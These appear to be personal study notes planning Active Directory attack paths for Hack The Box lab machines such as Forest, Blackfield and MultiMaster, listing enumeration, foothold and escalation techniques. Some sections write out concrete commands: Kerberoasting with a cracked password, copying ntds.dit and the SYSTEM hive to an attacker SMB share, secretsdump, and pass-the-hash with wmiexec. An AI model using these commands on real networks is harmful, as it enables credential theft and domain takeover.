
Now I will make different attack plans based on the box but it was clearly written that will get fail if we went with this strategy.


# Forest:
#### **Things to Look For**:

1. **Ports and Services**:
    
    - LDAP (389) and SMB (445) for AD enumeration.
    - RDP (3389) for potential remote access.
2. **AD Enumeration**:
    
    - Kerberos attacks (ASREPRoasting, Kerberoasting).
    - Domain trusts and privilege relationships with BloodHound.
3. **Credentials**:
    
    - Always check for hashes or passwords in dumped data.
    - Look for misconfigurations in permissions (`WriteDACL` or `WriteOwner`).
4. **Foothold and Escalation**:
    
    - Use PowerShell tools like PowerView for post-compromise enumeration.
    - Escalate using credentials and lateral movement (e.g., PsExec).


ASREPRoasting
Enumeration with Bloodhound
DCSync Attack

ldapsearch -h <ip_Address> -p 389 -x -b "dc=htb,dc=local"

Enumeration:
Nmap 
Ldap

Foothold:
GetNPUsers.py
HashCat 

1st way Privilege Escalation:
Bloodhound
Exchange Windows Permission -> WriteDacl
PowerView
Secretsdump/Psexec


2nd way Privilege Escalation:
Golden Ticket
Psexec / smb





# Sauna:

#### **Things to Look For**:

1. **Services and Protocols**:
    
    - LDAP (389) and Kerberos (88) for AD attacks.
    - SMB (445) for share enumeration and lateral movement.
    - Web services for potential vulnerabilities and misconfigurations.
2. **Hashes and Credentials**:
    
    - Use tools like `GetNPUsers.py` and `kerbrute` to extract Kerberos hashes.
    - Crack credentials with `Hashcat` and use them for WinRM or SMB access.
3. **Privilege Escalation**:
    
    - Enumerate AD relationships with **BloodHound**.
    - Perform DCSync attacks with `secretsdump.py` to extract domain hashes.


ASREPRoasting
DCSync Attack

Enumeration:
Nmap 
Ldap
SMB
Web

Foothold:
HashCat 
WinRM

Privilege Escalation:
Bloodhound
DCSync 


Sauna:

Enumeration:
Nmap 
enum4linux
kerbrute 
GetNPUsers.py
HashCat

Foothold:
HashCat 
WinRM -> Evil-winrm

Privilege Escalation:
Bloodhound
DCSync 
secretsdump.py



# Active:

- **Weak Credentials**:
    
    - Default or embedded credentials in GPP files.
    - Reuse of credentials across services.
- **AD Exploitation**:
    
    - Enumerate SPNs and other Kerberos-related vulnerabilities.
    - Misconfigured permissions or roles for privilege escalation.
- **SMB Shares**:
    
    - Look for sensitive files like GPP configurations or password stores.
- **Service-Specific Vulnerabilities**:
    
    - Focus on LDAP, SMB, and Kerberos for AD environments.


SMB enumeration techniques

Enumeration:
Nmap
SMB

Foothold:
GPP
Authenticated Enumeration

Privilege Escalation:
Kerberoasting


GetUserSPNs.py active.htb/svc_tgs:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request


# Blackfield:

### **Things to Look For**:

1. **AD Exploitation**:
    
    - Leverage Backup Operators or misconfigured permissions for privilege escalation.
    - Target files like `NTDS.dit` and `SYSTEM` hive for domain-wide credential access.
2. **Credential Handling**:
    
    - Always analyze dumped hashes with tools like `secretsdump.py`.
3. **SMB Shares**:
    
    - Look for misconfigurations or sensitive files in shared directories.
4. **Enumeration Focus**:
    
    - LDAP and Kerberos enumeration for AD environments.

Leveraging Backup Operators group membership (SeBackup and SeRestore privileges)
Dumping credentials for LSASS
Anonymous / Guest Enumeration


Enumeration:
Nmap

Foothold:
SMBMAP
Smbclient
GetNPUsers

Privilege Escalation:
BloodHound
Rpcclient
lsass 
ldapsearch
Dumping Hashes with WBAdmin
Robocopy
Steal Ntds

reg save HKLM\SYSTEM C:\system.hive

cp ntds.dit \\10.10.14.3\smb\NTDS.dit
cp system.hive \\10.10.14.3\smb\system.hive

secretsdump.py -ntds NTDS.dit -system system.hive LOCAL

wmiexec.py -hashes :184fb5e5178480be64824d4cd53b99ee administrator@10.10.10.192

wbadmin start backup -backuptarget:\\10.10.10.192\C$\Windows\Temp\CFX\ -include:c:\Windows\ntds\ntds.dit -quiet


# Resolute:

### **Things to Look For**:

1. **AD Enumeration**:
    
    - Focus on groups like `DnsAdmins` or `Backup Operators` for privilege escalation.
    - Check permissions for paths allowing exploitation or file drops.
2. **SMB Shares**:
    
    - Always investigate shared files for sensitive information or misconfigurations.
3. **Built-In Tools**:
    
    - Identify and exploit Windows-native binaries (LOLbas) for stealthy privilege escalation.
4. **Lateral Movement**:
    
    - Use BloodHound and tools like WinPEAS to identify pathways to escalate or move laterally.

Resolute:
DnsAdmins Abuse

Enumeration:
Nmap
LDAP

Foothold:


Lateral Movement:
bloodhound
Winpeas

Privilege Escalation:
LOLbas


# Reel:

### **Things to Look For**:

1. **Client-Side Exploits**:
    
    - Identify opportunities for phishing or social engineering.
    - Use CVEs like **CVE-2017-0199** to craft malicious documents.
2. **AD Permissions**:
    
    - Look for weak DACL configurations in AD objects.
    - Exploit `WriteOwner`, `GenericWrite`, or similar permissions.
3. **FTP and SMB**:
    
    - FTP servers for accessible files with sensitive metadata.
    - SMB shares for misconfigurations or sensitive data storage.
4. **Service-Specific Exploitation**:
    
    - Host and deliver phishing payloads via SMTP, HTTP, or SMB servers.


Reel:
Client-Side Attack
Document Metadata aka Phishing attack
Malicious SMTP server, web server & listener
AD DACL attack chain

Enumeration:
Nmap
FTP
Exiftool
GoPhish | Empire | CVE-2017-0199

Foothold:

Privilege Escalation:
bloodhound
AD WriteOwner | GenericWrite | 

net use z: \\10.10.16.20\share
impacket-smbserver share $(pwd)


# Sizzle: 

### **Things to Look For**:

1. **Weak AD Configurations**:
    
    - Misconfigured SMB shares or certificate services (`CERTSRV`).
    - Privileges such as `DCSync` or SPN misconfigurations for Kerberoasting.
2. **Hashes and Credentials**:
    
    - Capture NTLM hashes through SCF attacks or SMB enumeration.
    - Crack hashes or use pass-the-hash techniques for passwordless login.
3. **Service Exploitation**:
    
    - Use Kerberoasting to target service accounts.
    - Focus on obtaining hashes or plaintext credentials via Mimikatz or `secretsdump.py`.


Sizzle:
AD Enumeration
Mimikatz
Stealing Hashes
Passwordless Login
Kerberoasting
DCSync


Enumeration:
Nmap
Gobuster
FTP Enumeration
SMB Enumeration
CERTSRV


Foothold:
scf_attack

# Mantis

### **Things to Look For**:

1. **Kerberos Misconfigurations**:
    - Exploit vulnerabilities like MS14-068 or look for opportunities for Kerberoasting.
2. **Database Exposure**:
    - Unsecured SQL Server databases often provide sensitive information or credentials.
3. **AD Weaknesses**:
    - Target the Domain Controller through Kerberos vulnerabilities or poorly secured permissions.


Mantis:
Knowledge
Windows Server 
Domain Controller

Enumerating SQL Server Express Databases
Exploit DC & Kerberos

Enumeration:
CyberChef
Nmap
Dirbuster


Foothold:
MS14-068 Vulnerability




# Cascade 

### **Things to Look For**:

1. **Weak Password Storage**:
    - Check for stored or poorly encrypted credentials in SMB shares, databases, or registry keys.
2. **AD Weaknesses**:
    - Target AD enumeration paths and recycle bins for deleted but recoverable data.
3. **Reverse Engineering Opportunities**:
    - Exploit poorly implemented encryption or logic flaws in .NET applications.


Cascade:
LDAP Enumeration
SMB Enumeration
Processing SQLite DB
Reverse Eng .NET Assemblies


TightVNC Password Extration
AE Encryption
AD Enumeration
AD Recycle Bin


Enumeration:
Nmap
smbclient 
LDAP
sqlitebrowser


Foothold:
WDigest
Reverse Eng dnSpy


# MultiMaster

### **Things to Look For**:

1. **AD Weaknesses**:
    - Focus on abusing privileges like SeBackup and Server Operators.
    - Target the Domain Controller with tools like **Secretsdump**.
2. **SQL Injection**:
    - Exploit database vulnerabilities to extract sensitive information or credentials.
3. **Exploits**:
    - Apply critical exploits like **CVE-2020-1472 (Zero Logon)** for immediate privilege escalation.

Multimaster:
Basic Knowledge of Windows / AD
OWASP Top 10


Skills:
SQL injection
Password Cracking
VS Code Exploitation
Reverse Engineering
Sever Operators Group Abuse
SeBackup Privilege Abuse
Zerologon Exploitation


Enumeration:
Nmap
SQL Injection


Foothold:
WinRM
Lateral Movement
BloodHound
GetNPUsers
CVE-2020-1472 | Zero Logon Attack
Secretdump


# Return

